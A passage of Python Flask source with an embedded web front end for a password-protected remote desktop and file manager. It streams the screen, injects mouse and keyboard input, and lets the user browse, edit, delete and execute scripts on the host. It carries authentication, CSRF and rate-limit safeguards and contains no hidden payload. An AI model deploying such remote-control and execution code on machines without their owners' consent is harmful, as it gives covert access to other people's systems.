                fileList.addEventListener(eventName, () => {
                    fileList.style.border = '2px dashed var(--accent)';
                    fileList.style.background = 'rgba(0, 212, 255, 0.05)';
                }, false);
            });
            
            ['dragleave', 'drop'].forEach(eventName => {
                fileList.addEventListener(eventName, () => {
                    fileList.style.border = '';
                    fileList.style.background = '';
                }, false);
            });
            
            fileList.addEventListener('drop', (e) => {
                const dt = e.dataTransfer;
                const files = dt.files;
                if (files.length > 0) {
                    handleUpload(files);
                }
            });
        }
        
        async function checkAuth() {
            try {
                const res = await fetch('api/ping', {
                    headers: {'X-CSRF-Token': CSRF_TOKEN}
                });
                if (res.ok) {
                    isAuthenticated = true;
                    document.getElementById('loginOverlay').style.display = 'none';
                    loadDirectory(currentPath);
                } else {
                    document.getElementById('loginOverlay').style.display = 'flex';
                }
            } catch(e) {
                document.getElementById('loginOverlay').style.display = 'flex';
            }
        }
        
        async function doLogin() {
            const pwd = document.getElementById('loginPassword').value;
            const btn = document.querySelector('.login-btn');
            const error = document.getElementById('loginError');
            
            btn.disabled = true;
            btn.textContent = 'Verifying...';
            error.style.display = 'none';
            
            try {
                const res = await fetch('auth', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                        'X-CSRF-Token': CSRF_TOKEN
                    },
                    body: JSON.stringify({password: pwd})
                });
                
                if (res.status === 429) {
                    error.textContent = 'Too many attempts. Please wait.';
                    error.style.display = 'block';
                    btn.disabled = false;
                    btn.textContent = 'Access File Manager';
                    return;
                }
                
                const data = await res.json();
                
                if (data.success) {
                    isAuthenticated = true;
                    document.getElementById('loginOverlay').style.display = 'none';
                    loadDirectory(currentPath);
                } else {
                    error.textContent = 'Invalid password';
                    error.style.display = 'block';
                    btn.disabled = false;
                    btn.textContent = 'Access File Manager';
                    document.getElementById('loginPassword').value = '';
                }
            } catch(e) {
                error.textContent = 'Connection error';
                error.style.display = 'block';
                btn.disabled = false;
            }
        }
        
        async function logout() {
            await fetch('logout', {
                method: 'POST',
                headers: {'X-CSRF-Token': CSRF_TOKEN}
            });
            window.location.reload();
        }
        
        document.getElementById('loginPassword').addEventListener('keypress', (e) => {
            if (e.key === 'Enter') doLogin();
        });
        
        async function loadDirectory(path) {
            if (!isAuthenticated) return;
            currentPath = path;
            showStatus('Loading...');
            try {
                const encodedPath = encodeURIComponent(path);
                const res = await fetch('api/list?path=' + encodedPath, {
                    headers: {'X-CSRF-Token': CSRF_TOKEN}
                });
                
                if (res.status === 401) {
                    document.getElementById('loginOverlay').style.display = 'flex';
                    return;
                }
                if (res.status === 404) {
                    showStatus('Directory not found', true);
                    return;
                }
                if (res.status === 403) {
                    showStatus('Access denied', true);
                    return;
                }
                
                const data = await res.json();
                if (data.error) {
                    showStatus(data.error, true);
                    return;
                }
                currentFiles = data.files;
                renderBreadcrumbs(path);
                renderFiles(data.files);
                updateStatus(data.files.length);
                selectedFiles.clear();
                updateSelectionUI();
            } catch (err) {
                showStatus('Failed to load directory', true);
            }
        }
        
        function renderFiles(files) {
            const list = document.getElementById('file-list');
            if (files.length === 0) {
                list.innerHTML = '<div class="empty-state"><div style="font-size: 64px; opacity: 0.3;">📂</div><div>This folder is empty</div><div style="font-size: 12px; margin-top: 8px; color: var(--text-dim);">Drag files here or click Upload</div></div>';
                return;
            }
            list.innerHTML = '';
            if (currentPath !== CONFIG.root && currentPath !== '/') {
                const parent = document.createElement('div');
                parent.className = 'file-item';
                parent.innerHTML = '<div></div><div class="file-info"><div class="file-icon">⬆️</div><div class="file-name">..</div></div><div></div><div></div><div></div>';
                parent.ondblclick = goUp;
                list.appendChild(parent);
            }
            files.forEach(file => {
                const div = document.createElement('div');
                div.className = 'file-item';
                div.dataset.name = file.name;
                div.dataset.type = file.type;
                div.dataset.ext = file.name.split('.').pop().toLowerCase();
                const icon = file.type === 'directory' ? '📁' : getFileIcon(file.name);
                const size = file.type === 'directory' ? '--' : formatSize(file.size);
                const date = file.modified ? new Date(file.modified).toLocaleString() : '--';
                const ext = file.type === 'directory' ? 'Folder' : file.name.split('.').pop().toUpperCase();
                
                const safeName = escapeHtml(file.name);
                
                div.innerHTML = `
                    <div><input type="checkbox" class="file-checkbox" onchange="toggleSelect('${safeName}', this.checked)"></div>
                    <div class="file-info"><div class="file-icon">${icon}</div><div class="file-name" title="${safeName}">${safeName}</div></div>
                    <div class="file-meta">${size}</div>
                    <div class="file-meta">${date}</div>
                    <div class="file-meta">${ext}</div>
                `;
                div.onclick = (e) => { if (e.target.type !== 'checkbox') selectFile(file.name, e); };
                div.ondblclick = () => openItem(file.name, file.type);
                div.oncontextmenu = (e) => showContext(e, file.name, file.type);
                list.appendChild(div);
            });
        }
        
        function getFileIcon(name) {
            const ext = name.split('.').pop().toLowerCase();
            const icons = {
                txt:'📄',pdf:'📕',doc:'📝',docx:'📝',jpg:'🖼️',jpeg:'🖼️',png:'🖼️',gif:'🖼️',
                mp4:'🎬',mp3:'🎵',zip:'📦',rar:'📦',7z:'📦',py:'🐍',js:'📜',html:'🌐',css:'🎨',
                exe:'⚙️',bat:'⚙️',cmd:'⚙️',sh:'⚙️',ps1:'⚙️',vbs:'⚙️',json:'📋',xml:'📋',md:'📝',
                log:'📄',csv:'📊',ini:'⚙️',cfg:'⚙️'
            };
            return icons[ext] || '📄';
        }
        
        function formatSize(bytes) {
            if (bytes === 0) return '0 B';
            const k = 1024;
            const sizes = ['B','KB','MB','GB','TB'];
            const i = Math.floor(Math.log(bytes) / Math.log(k));
            return parseFloat((bytes / Math.pow(k, i)).toFixed(1)) + ' ' + sizes[i];
        }
        
        function escapeHtml(text) {
            if (!text) return '';
            const div = document.createElement('div');
            div.textContent = text;
            return div.innerHTML;
        }
        
        function selectFile(name, event) {
            if (!event.ctrlKey && !event.metaKey && !event.shiftKey) {
                selectedFiles.clear();
                document.querySelectorAll('.file-item').forEach(item => item.classList.remove('selected'));
                document.querySelectorAll('.file-checkbox').forEach(cb => cb.checked = false);
            }
            toggleSelect(name, !selectedFiles.has(name));
        }
        
        function toggleSelect(name, checked) {
            const items = document.querySelectorAll('.file-item');
            items.forEach(item => {
                if (item.dataset.name === name) {
                    if (checked) {
                        item.classList.add('selected');
                        item.querySelector('.file-checkbox').checked = true;
                    } else {
                        item.classList.remove('selected');
                        item.querySelector('.file-checkbox').checked = false;
                    }
                }
            });
            if (checked) {
                selectedFiles.add(name);
            } else {
                selectedFiles.delete(name);
            }
            updateSelectionUI();
        }
        
        function toggleSelectAll() {
            const checkboxes = document.querySelectorAll('.file-checkbox');
            const allChecked = selectedFiles.size === currentFiles.length;
            selectedFiles.clear();
            checkboxes.forEach(cb => cb.checked = !allChecked);
            if (!allChecked) {
                currentFiles.forEach(f => selectedFiles.add(f.name));
                document.querySelectorAll('.file-item').forEach(item => item.classList.add('selected'));
            } else {
                document.querySelectorAll('.file-item').forEach(item => item.classList.remove('selected'));
            }
            updateSelectionUI();
        }
        
        function updateSelectionUI() {
            const count = selectedFiles.size;
            document.getElementById('btn-download').disabled = count === 0;
            document.getElementById('btn-delete').disabled = count === 0;
            
            // Check if selected files are executable or editable
            let hasEditable = false;
            let hasExecutable = false;
            selectedFiles.forEach(name => {
                const ext = name.split('.').pop().toLowerCase();
                if (['txt','py','js','html','css','json','xml','md','log','csv','ini','cfg','bat','sh','ps1','vbs'].includes(ext)) {
                    hasEditable = true;
                }
                if (['py','bat','cmd','sh','ps1','vbs','js'].includes(ext)) {
                    hasExecutable = true;
                }
            });
            
            document.getElementById('btn-edit').disabled = !hasEditable;
            document.getElementById('btn-exec').disabled = !hasExecutable;
            
            const badge = document.getElementById('selection-badge');
            badge.textContent = count + ' selected';
            badge.classList.toggle('active', count > 0);
            document.getElementById('select-all').checked = count === currentFiles.length && count > 0;
        }
        
        // Open/Execute File Handler
        async function openItem(name, type) {
            if (type === 'directory') {
                const sep = currentPath.includes('/') ? '/' : '\\\\';
                const newPath = currentPath.endsWith(sep) ? currentPath + name : currentPath + sep + name;
                loadDirectory(newPath);
            } else {
                const ext = name.split('.').pop().toLowerCase();
                const executableExts = ['py', 'bat', 'cmd', 'sh', 'ps1', 'vbs', 'js'];
                
                if (executableExts.includes(ext)) {
                    // Ask whether to execute or edit
                    if (confirm(`Execute ${name}?\\n\\nClick OK to run, Cancel to view/edit.`)) {
                        executeFile(name);
                    } else {
                        editFile(name);
                    }
                } else if (['jpg','jpeg','png','gif','bmp','webp'].includes(ext)) {
                    previewFile(name);
                } else if (['txt','json','xml','md','log','csv','html','css'].includes(ext)) {
                    editFile(name);
                } else {
                    downloadFile(name);
                }
            }
        }
        
        function showContext(e, filename, type) {
            e.preventDefault();
            contextTarget = filename;
            const menu = document.getElementById('context-menu');
            
            // Update menu based on file type
            const ext = filename.split('.').pop().toLowerCase();
            const isExecutable = ['py','bat','cmd','sh','ps1','vbs','js'].includes(ext);
            const isImage = ['jpg','jpeg','png','gif','bmp','webp'].includes(ext);
            const isText = ['txt','json','xml','md','log','csv','html','css','ini','cfg'].includes(ext);
            
            let menuHTML = '';
            if (type === 'directory') {
                menuHTML += `<div class="context-item" onclick="contextAction('open')"><span>📂</span> Open</div>`;
            } else {
                menuHTML += `<div class="context-item" onclick="contextAction('open')"><span>📂</span> Open</div>`;
                if (isImage || isText) {
                    menuHTML += `<div class="context-item" onclick="contextAction('preview')"><span>👁️</span> Preview</div>`;
                }
                if (isExecutable) {
                    menuHTML += `<div class="context-item" onclick="contextAction('execute')" style="color: var(--warning)"><span>▶️</span> Execute</div>`;
                }
                menuHTML += `<div class="context-item" onclick="contextAction('download')"><span>⬇️</span> Download</div>`;
                if (isText) {
                    menuHTML += `<div class="context-item" onclick="contextAction('edit')"><span>✏️</span> Edit</div>`;
                }
            }
            menuHTML += `<div class="context-divider"></div>`;
            menuHTML += `<div class="context-item danger" onclick="contextAction('delete')"><span>🗑️</span> Delete</div>`;
            
            menu.innerHTML = menuHTML;
            menu.style.display = 'block';
            menu.style.left = Math.min(e.pageX, window.innerWidth - 220) + 'px';
            menu.style.top = Math.min(e.pageY, window.innerHeight - 300) + 'px';
        }
        
        function contextAction(action) {
            if (!contextTarget) return;
            switch(action) {
                case 'open': openItem(contextTarget, 'file'); break;
                case 'preview': previewFile(contextTarget); break;
                case 'execute': executeFile(contextTarget); break;
                case 'download': downloadFile(contextTarget); break;
                case 'edit': editFile(contextTarget); break;
                case 'delete': deleteFile(contextTarget); break;
            }
            document.getElementById('context-menu').style.display = 'none';
        }
        
        // Execute Functionality
        async function executeFile(name) {
            const sep = currentPath.includes('/') ? '/' : '\\\\';
            const path = currentPath.endsWith(sep) ? currentPath + name : currentPath + sep + name;
            
            if (!confirm(`WARNING: You are about to execute:\\n\\n${name}\\n\\nThis may be dangerous. Continue?`)) {
                return;
            }
            
            showStatus('Executing ' + name + '...');
            
            try {
                const res = await fetch('api/execute', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                        'X-CSRF-Token': CSRF_TOKEN
                    },
                    body: JSON.stringify({path: path})
                });
                
                const data = await res.json();
                
                if (res.ok && data.success) {
                    showExecutionResult(name, data);
                } else {
                    alert('Execution failed:\\n' + (data.error || 'Unknown error'));
                    showStatus('Execution failed', true);
                }
            } catch(e) {
                alert('Error executing file: ' + e.message);
                showStatus('Execution error', true);
            }
        }
        
        function showExecutionResult(filename, data) {
            const modal = document.getElementById('editor-modal');
            const title = document.getElementById('editor-title');
            const content = document.getElementById('editor-content');
            
            title.textContent = 'Execution Result: ' + filename;
            
            let output = '';
            if (data.command) output += `Command: ${data.command}\\n`;
            output += `Return Code: ${data.returncode}\\n`;
            output += `${'='.repeat(50)}\\n\\n`;
            
            if (data.stdout) {
                output += 'STDOUT:\\n' + data.stdout + '\\n\\n';
            }
            if (data.stderr) {
                output += 'STDERR:\\n' + data.stderr + '\\n\\n';
            }
            
            content.value = output;
            content.readOnly = true;
            document.getElementById('save-btn').style.display = 'none';
            
            modal.classList.add('active');
            showStatus('Execution completed');
        }
        
        function executeSelected() {
            const file = Array.from(selectedFiles)[0];
            if (file) executeFile(file);
        }
        
        // Preview Functionality
        async function previewFile(name) {
            const sep = currentPath.includes('/') ? '/' : '\\\\';
            const path = currentPath.endsWith(sep) ? currentPath + name : currentPath + sep + name;
            const ext = name.split('.').pop().toLowerCase();
            
            document.getElementById('preview-title').textContent = name;
            const content = document.getElementById('preview-content');
            content.innerHTML = '<div class="empty-state"><div style="font-size: 32px">⟳</div><div>Loading...</div></div>';
            
            document.getElementById('preview').classList.add('active');
            
            try {
                const res = await fetch('api/open?path=' + encodeURIComponent(path), {
                    headers: {'X-CSRF-Token': CSRF_TOKEN}
                });
                
                if (!res.ok) throw new Error('Failed to load');
                const data = await res.json();
                
                if (data.type === 'image') {
                    content.innerHTML = `<img src="data:${data.mime};base64,${data.data}" class="preview-image" alt="${escapeHtml(name)}">`;
                } else if (data.type === 'text') {
                    content.innerHTML = `<pre class="preview-text">${escapeHtml(data.content)}</pre>`;
                } else {
                    content.innerHTML = `
                        <div class="empty-state">
                            <div style="font-size: 64px">📄</div>
                            <div>Preview not available</div>
                            <button class="btn primary" onclick="downloadFile('${escapeHtml(name)}')" style="margin-top: 20px;">
                                ⬇️ Download File
                            </button>
                        </div>
                    `;
                }
            } catch(e) {
                content.innerHTML = '<div class="empty-state"><div style="color: var(--danger)">Error loading preview</div></div>';
            }
        }
        
        function closePreview() {
            document.getElementById('preview').classList.remove('active');
        }
        
        // Edit Functionality
        async function editFile(name) {
            const sep = currentPath.includes('/') ? '/' : '\\\\';
            const path = currentPath.endsWith(sep) ? currentPath + name : currentPath + sep + name;
            
            currentEditFile = path;
            document.getElementById('editor-title').textContent = 'Edit: ' + name;
            document.getElementById('editor-content').value = 'Loading...';
            document.getElementById('editor-content').readOnly = false;
            document.getElementById('save-btn').style.display = 'flex';
            document.getElementById('editor-modal').classList.add('active');
            
            try {
                const res = await fetch('api/read?path=' + encodeURIComponent(path), {
                    headers: {'X-CSRF-Token': CSRF_TOKEN}
                });
                if (res.ok) {
                    const data = await res.json();
                    document.getElementById('editor-content').value = data.content;
                    document.getElementById('editor-info').textContent = `${formatSize(data.size)} | UTF-8`;
                } else {
                    const err = await res.json();
                    alert('Error: ' + (err.error || 'Failed to read file'));
                    closeEditor();
                }
            } catch(e) {
                alert('Error reading file');
                closeEditor();
            }
        }
        
        function editSelected() {
            const file = Array.from(selectedFiles)[0];
            if (file) editFile(file);
        }
        
        async function saveFile() {
            if (!currentEditFile) return;
            
            const content = document.getElementById('editor-content').value;
            const btn = document.getElementById('save-btn');
            const originalText = btn.textContent;
            
            btn.disabled = true;
            btn.textContent = 'Saving...';
            
            try {
                const res = await fetch('api/save', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                        'X-CSRF-Token': CSRF_TOKEN
                    },
                    body: JSON.stringify({
                        path: currentEditFile,
                        content: content
                    })
                });
                
                if (res.ok) {
                    showStatus('File saved successfully');
                    closeEditor();
                } else {
                    const err = await res.json();
                    alert('Error saving: ' + (err.error || 'Unknown error'));
                }
            } catch(e) {
                alert('Error saving file');
            } finally {
                btn.disabled = false;
                btn.textContent = originalText;
            }
        }
        
        function closeEditor() {
            document.getElementById('editor-modal').classList.remove('active');
            currentEditFile = null;
            document.getElementById('editor-content').readOnly = false;
            document.getElementById('save-btn').style.display = 'flex';
        }
        
        function formatContent() {
            const textarea = document.getElementById('editor-content');
            try {
                const obj = JSON.parse(textarea.value);
                textarea.value = JSON.stringify(obj, null, 2);
            } catch(e) {
                // Not JSON, ignore
            }
        }
        
        // Download Functions
        async function downloadFile(name) {
            const sep = currentPath.includes('/') ? '/' : '\\\\';
            const path = currentPath.endsWith(sep) ? currentPath + name : currentPath + sep + name;
            await downloadWithProgress(name, 'api/download?path=' + encodeURIComponent(path));
        }
        
        async function downloadWithProgress(filename, url) {
            const overlay = document.getElementById('progress-overlay');
            const progressBar = document.getElementById('progress-bar');
            const progressText = document.getElementById('progress-text');
            const progressFile = document.getElementById('progress-file');
            
            progressFile.textContent = filename;
            progressBar.style.width = '0%';
            progressText.textContent = '0%';
            overlay.style.display = 'flex';
            
            try {
                currentDownloadController = new AbortController();
                const response = await fetch(url, { 
                    signal: currentDownloadController.signal,
                    headers: {'X-CSRF-Token': CSRF_TOKEN}
                });
                if (!response.ok) throw new Error('Download failed');
                const contentLength = +(response.headers.get('Content-Length') || 0);
                const reader = response.body.getReader();
                let receivedLength = 0;
                const chunks = [];
                
                while (true) {
                    const { done, value } = await reader.read();
                    if (done) break;
                    chunks.push(value);
                    receivedLength += value.length;
                    const percent = contentLength ? Math.round((receivedLength / contentLength) * 100) : 0;
                    progressBar.style.width = percent + '%';
                    progressText.textContent = percent + '%';
                }
                
                const blob = new Blob(chunks);
                const downloadUrl = URL.createObjectURL(blob);
                const a = document.createElement('a');
                a.href = downloadUrl;
                a.download = filename;
                document.body.appendChild(a);
                a.click();
                document.body.removeChild(a);
                URL.revokeObjectURL(downloadUrl);
                showStatus('Downloaded: ' + filename);
                setTimeout(() => overlay.style.display = 'none', 500);
            } catch (err) {
                if (err.name !== 'AbortError') {
                    showStatus('Download failed', true);
                }
                overlay.style.display = 'none';
            }
        }
        
        function cancelDownload() {
            if (currentDownloadController) {
                currentDownloadController.abort();
            }
        }
        
        async function downloadSelected() {
            for (let name of selectedFiles) {
                await downloadFile(name);
            }
        }
        
        // Delete Functions
        async function deleteFile(name) {
            if (!confirm('Delete ' + name + '?')) return;
            const sep = currentPath.includes('/') ? '/' : '\\\\';
            const path = currentPath.endsWith(sep) ? currentPath + name : currentPath + sep + name;
            
            try {
                const res = await fetch('api/delete', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                        'X-CSRF-Token': CSRF_TOKEN
                    },
                    body: JSON.stringify({path: path})
                });
                if (res.ok) {
                    loadDirectory(currentPath);
                    showStatus('Deleted: ' + name);
                } else {
                    showStatus('Delete failed', true);
                }
            } catch(e) {
                showStatus('Delete failed', true);
            }
        }
        
        async function deleteSelected() {
            if (!confirm('Delete ' + selectedFiles.size + ' item(s)?')) return;
            for (let name of selectedFiles) {
                await deleteFile(name);
            }
            selectedFiles.clear();
            updateSelectionUI();
        }
        
        // Upload Functions - Fixed to ensure directory targeting
        function triggerUpload() {
            document.getElementById('file-input').click();
        }
        
        async function handleUpload(files) {
            if (!files.length) return;
            showStatus('Uploading ' + files.length + ' file(s) to ' + currentPath + '...');
            
            const formData = new FormData();
            for (let f of files) {
                formData.append('files', f);
            }
            formData.append('path', currentPath); // Ensure current directory is sent
            
            try {
                const res = await fetch('api/upload', { 
                    method: 'POST', 
                    body: formData,
                    headers: {'X-CSRF-Token': CSRF_TOKEN}
                });
                const data = await res.json();
                if (data.success) {
                    showStatus(`Uploaded ${data.count} file(s) to ${data.target_directory}`);
                    loadDirectory(currentPath);
                } else {
                    showStatus(data.error || 'Upload failed', true);
                }
            } catch (err) {
                showStatus('Upload failed: ' + err.message, true);
            }
            document.getElementById('file-input').value = '';
        }
        
        // Directory Operations
        function newFolder() {
            const name = prompt('Folder name:');
            if (name) {
                fetch('api/mkdir', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                        'X-CSRF-Token': CSRF_TOKEN
                    },
                    body: JSON.stringify({path: currentPath, name})
                }).then(r => {
                    if (r.ok) {
                        loadDirectory(currentPath);
                        showStatus('Folder created');
                    } else {
                        showStatus('Failed to create folder', true);
                    }
                });
            }
        }
        
        function goBack() { history.back(); }
        function goUp() {
            const sep = currentPath.includes('/') ? '/' : '\\\\';
            const parts = currentPath.split(sep).filter(Boolean);
            if (parts.length > 0) {
                parts.pop();
                loadDirectory(parts.join(sep) || CONFIG.root);
            }
        }
        function refresh() { loadDirectory(currentPath); }
        
        function renderBreadcrumbs(path) {
            const container = document.getElementById('path-bar');
            container.innerHTML = '<div class="path-segment" onclick="loadDirectory(CONFIG.root)">📁 Root</div>';
            if (path === CONFIG.root) return;
            const sep = path.includes('/') ? '/' : '\\\\';
            const parts = path.split(sep).filter(Boolean);
            let current = CONFIG.root;
            parts.forEach((part, idx) => {
                current += sep + part;
                const isLast = idx === parts.length - 1;
                const div = document.createElement('div');
                div.className = 'path-segment' + (isLast ? ' current' : '');
                div.textContent = part;
                if (!isLast) div.onclick = () => loadDirectory(current);
                container.appendChild(div);
            });
        }
        
        function showStatus(text, isError) {
            const el = document.getElementById('status-text');
            el.textContent = text;
            el.style.color = isError ? 'var(--danger)' : '';
            setTimeout(() => { el.textContent = 'Ready'; el.style.color = ''; }, 3000);
        }
        
        function updateStatus(count) {
            document.getElementById('item-count').textContent = count + ' items';
        }
        
        // Keyboard shortcuts
        document.addEventListener('keydown', (e) => {
            if (e.key === 'Escape') {
                closePreview();
                closeEditor();
                document.getElementById('context-menu').style.display = 'none';
            }
            if (e.ctrlKey && e.key === 's' && document.getElementById('editor-modal').classList.contains('active')) {
                e.preventDefault();
                if (!document.getElementById('editor-content').readOnly) {
                    saveFile();
                }
            }
            if (e.ctrlKey && e.key === 'u') {
                e.preventDefault();
                triggerUpload();
            }
        });
        
        document.addEventListener('click', function(e) {
            if (!e.target.closest('.context-menu')) {
                document.getElementById('context-menu').style.display = 'none';
            }
        });
    </script>
</body>
</html>'''

# ============================================================================
# ROUTES - REMOTE DESKTOP
# ============================================================================
@rd_bp.route('/')
def rd_index():
    # Check if authenticated
    if not session.get('authenticated'):
        csrf_token = generate_csrf_token()
        next_url = request.args.get('next', '')
        return render_template_string(LOGIN_HTML, 
                                    csrf_token=csrf_token,
                                    service_name="Remote Desktop",
                                    auth_endpoint="/rd/auth",
                                    next_url=next_url)
    
    csrf_token = generate_csrf_token()
    return render_template_string(RD_HTML_TEMPLATE, csrf_token=csrf_token)

@rd_bp.route('/auth', methods=['POST'])
@rate_limit(key='login')
def rd_auth():
    client_ip = request.remote_addr
    
    if not check_brute_force(client_ip):
        return jsonify({'error': 'Too many attempts. Try again later.'}), 429
    
    data = request.get_json()
    if not data:
        record_failed_login(client_ip)
        return jsonify({'success': False}), 403
    
    password = data.get('password', '')
    
    from flask import current_app
    expected = current_app.config.get('RA_PASSWORD', '')
    
    if len(password) != len(expected):
        record_failed_login(client_ip)
        return jsonify({'success': False}), 403
    
    if hmac.compare_digest(password.encode(), expected.encode()):
        session['authenticated'] = True
        session['last_activity'] = datetime.now().isoformat()
        return jsonify({'success': True})
    
    record_failed_login(client_ip)
    return jsonify({'success': False}), 403

@rd_bp.route('/logout', methods=['POST'])
def rd_logout():
    session.clear()
    return jsonify({'success': True})

@rd_bp.route('/info')
@require_auth
def rd_info():
    return jsonify({'width': screen_w, 'height': screen_h})

@rd_bp.route('/stream')
@require_auth
def rd_stream():
    def generate():
        while True:
            with frame_lock: 
                data = current_frame
            if data: 
                yield (b'--frame\r\nContent-Type: image/jpeg\r\n\r\n' + data + b'\r\n')
            time.sleep(1.0 / rd_settings.get('fps', 30))
    response = Response(generate(), mimetype='multipart/x-mixed-replace; boundary=frame')
    response.headers['Cache-Control'] = 'no-cache, no-store, must-revalidate'
    response.headers['Pragma'] = 'no-cache'
    response.headers['Expires'] = '0'
    return response

@rd_bp.route('/set_fps', methods=['POST'])
@require_auth
def rd_set_fps():
    data = request.get_json()
    rd_settings['fps'] = max(1, min(60, int(data.get('fps', 30))))
    return jsonify({'fps': rd_settings['fps']})

@rd_bp.route('/set_quality', methods=['POST'])
@require_auth
def rd_set_quality():
    data = request.get_json()
    rd_settings['quality'] = max(10, min(100, int(data.get('quality', 85))))
    return jsonify({'quality': rd_settings['quality']})

@rd_bp.route('/ping')
def rd_ping():
    # Allow ping to check auth status without requiring auth
    if not session.get('authenticated'):
        return jsonify({'error': 'Unauthorized'}), 401
    session['last_activity'] = datetime.now().isoformat()
    return jsonify({'pong': True, 'authenticated': True})

@rd_bp.route('/input', methods=['POST'])
@require_auth
def rd_input():
    if not PYAUTOGUI_AVAILABLE: 
        return jsonify({'error': 'Control unavailable'}), 503
    try:
        data = request.get_json()
        input_type = data.get('type')
        input_data = data.get('data', {})
        
        if input_type == 'move':
            x = max(0, min(screen_w, int(input_data['x'])))
            y = max(0, min(screen_h, int(input_data['y'])))
            pyautogui.moveTo(x, y, duration=0)
        elif input_type == 'mouse': 
            button = input_data.get('button', 'left')
            if button not in ['left', 'right', 'middle']:
                raise ValueError('Invalid button')
            if input_data.get('action') == 'down': 
                pyautogui.mouseDown(button=button)
            else: 
                pyautogui.mouseUp(button=button)
        elif input_type == 'scroll': 
            delta = max(-10, min(10, int(input_data.get('delta', 0))))
            pyautogui.scroll(delta)
        elif input_type == 'key':
            key = input_data.get('key', '')
            allowed = set('abcdefghijklmnopqrstuvwxyz0123456789 []{},.-=_+;')
            if not all(c in allowed for c in key):
                raise ValueError('Invalid key')
            if input_data.get('action') == 'down': 
                pyautogui.keyDown(key)
            else: 
                pyautogui.keyUp(key)
        return jsonify({'status': 'ok'})
    except Exception as e: 
        return jsonify({'error': str(e)}), 500

# ============================================================================
# ROUTES - FILE MANAGER
# ============================================================================
@fm_bp.route('/')
def fm_index():
    #  authentication check
    if not session.get('authenticated'):
        csrf_token = generate_csrf_token()
        return render_template_string(LOGIN_HTML,
                                    csrf_token=csrf_token,
                                    service_name="File Manager",
                                    auth_endpoint="/fm/auth",
                                    next_url="")
    
    home = str(Path.home())
    desktop = str(Path.home() / "Desktop")
    documents = str(Path.home() / "Documents")
    downloads = str(Path.home() / "Downloads")
    root = "C:\\" if sys.platform == 'win32' else "/"
    
    csrf_token = generate_csrf_token()
    
    return render_template_string(
        FM_HTML_TEMPLATE, 
        home_path=json.dumps(home),
        desktop_path=json.dumps(desktop),
        documents_path=json.dumps(documents), 
        downloads_path=json.dumps(downloads), 
        root_path=json.dumps(root),
        csrf_token=csrf_token
    )

@fm_bp.route('/auth', methods=['POST'])
@rate_limit(key='login')
def fm_auth():
    """ authentication endpoint for File Manager - same password as RD"""
    client_ip = request.remote_addr
    
    if not check_brute_force(client_ip):
        return jsonify({'error': 'Too many attempts. Try again later.'}), 429
    
    data = request.get_json()
    if not data:
        record_failed_login(client_ip)
        return jsonify({'success': False}), 403
    
    password = data.get('password', '')
    
    from flask import current_app
    expected = current_app.config.get('RA_PASSWORD', '')
    
    if len(password) != len(expected):
        record_failed_login(client_ip)
        return jsonify({'success': False}), 403
    
    if hmac.compare_digest(password.encode(), expected.encode()):
        session['authenticated'] = True
        session['last_activity'] = datetime.now().isoformat()
        return jsonify({'success': True})
    
    record_failed_login(client_ip)
    return jsonify({'success': False}), 403

@fm_bp.route('/logout', methods=['POST'])
def fm_logout():
    session.clear()
    return jsonify({'success': True})

@fm_bp.route('/api/ping')
def fm_ping():
    """Health check endpoint"""
    if not session.get('authenticated'):
        return jsonify({'error': 'Unauthorized'}), 401
    return jsonify({'pong': True})

@fm_bp.route('/api/list')
@require_auth
@validate_filepath
def fm_list():
    path = request.args.get('path', str(Path.home()))
    try:
        target = Path(path).resolve()
        if not target.exists(): 
            return jsonify({'error': 'Not found'}), 404
        if not target.is_dir():
            return jsonify({'error': 'Not a directory'}), 400
        
        files = []
        for item in sorted(target.iterdir()):
            try:
                stat = item.stat()
                files.append({
                    'name': item.name, 
                    'type': 'directory' if item.is_dir() else 'file', 
                    'size': stat.st_size, 
                    'modified': stat.st_mtime * 1000
                })
            except: 
                continue
        return jsonify({'files': files})
    except Exception as e: 
        return jsonify({'error': 'Access denied'}), 403

@fm_bp.route('/api/upload', methods=['POST'])
@require_auth
@validate_filepath
def fm_upload():
    if 'files' not in request.files: 
        return jsonify({'error': 'No files'}), 400
    path = request.form.get('path', str(Path.home()))
    target = Path(path).resolve()
    if not target.exists() or not target.is_dir(): 
        return jsonify({'error': 'Invalid path'}), 400
    
    uploaded = []
    for file in request.files.getlist('files'):
        if file.filename:
            safe_name = secure_filename(file.filename)
            if not safe_name or safe_name.startswith('.') or '..' in safe_name:
                continue
            try: 
                file_path = target / safe_name
                file_path.resolve().relative_to(target.resolve())
                file.save(str(file_path))
                uploaded.append(safe_name)
            except Exception as e: 
                return jsonify({'error': 'Upload failed'}), 500
    return jsonify({'success': True, 'files': uploaded})

@fm_bp.route('/api/download')
@require_auth
@validate_filepath
def fm_download():
    path = request.args.get('path', '')
    try:
        target = Path(path).resolve()
        if not target.exists() or not target.is_file(): 
            abort(404)
        if target.stat().st_size > 1024 * 1024 * 1024:  # 1GB limit
            return jsonify({'error': 'File too large'}), 413
        return send_file(str(target), as_attachment=True)
    except Exception as e: 
        return jsonify({'error': 'Access denied'}), 403

@fm_bp.route('/api/delete', methods=['POST'])
@require_auth
@validate_filepath
def fm_delete():
    try:
        data = request.get_json()
        target = Path(data['path']).resolve()
        
        critical_paths = ['C:\\Windows', 'C:\\Program Files', 'C:\\ProgramData', '/bin', '/sbin', '/usr', '/etc']
        target_str = str(target)
        for critical in critical_paths:
            if target_str.startswith(critical):
                return jsonify({'error': 'Cannot delete system directory'}), 403
        
        if target.is_dir(): 
            shutil.rmtree(str(target))
        else: 
            target.unlink()
        return jsonify({'success': True})
    except Exception as e: 
        return jsonify({'error': 'Delete failed'}), 500

@fm_bp.route('/api/rename', methods=['POST'])
@require_auth
@validate_filepath
def fm_rename():
    try:
        data = request.get_json()
        old = Path(data['old_path']).resolve()
        new = Path(data['new_path']).resolve()
        
        if old.parent != new.parent:
            return jsonify({'error': 'Invalid rename'}), 403
            
        old.rename(new)
        return jsonify({'success': True})
    except Exception as e: 
        return jsonify({'error': 'Rename failed'}), 500

@fm_bp.route('/api/mkdir', methods=['POST'])
@require_auth
@validate_filepath
def fm_mkdir():
    try:
        data = request.get_json()
        parent = Path(data['path']).resolve()
        name = secure_filename(data['name'])
        if not name:
            return jsonify({'error': 'Invalid name'}), 400
        (parent / name).mkdir(exist_ok=True)
        return jsonify({'success': True})
